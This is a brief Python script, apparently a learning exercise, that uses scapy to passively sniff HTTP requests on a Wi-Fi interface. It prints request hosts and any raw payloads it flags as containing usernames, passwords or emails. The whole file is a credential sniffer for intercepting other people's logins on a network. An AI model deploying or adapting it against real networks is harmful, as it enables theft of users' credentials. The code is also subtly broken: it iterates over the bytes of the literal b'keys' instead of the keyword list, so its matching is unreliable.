import scapy.all as scapy
from scapy.layers import http


def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet[http.HTTPRequest].Host)
        #print(packet)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for k in b'keys':
                if k in load:
                    print("Entered Username/Password"+str(load))
                    break


if __name__ == '__main__':
    sniffing("Wi-Fi")
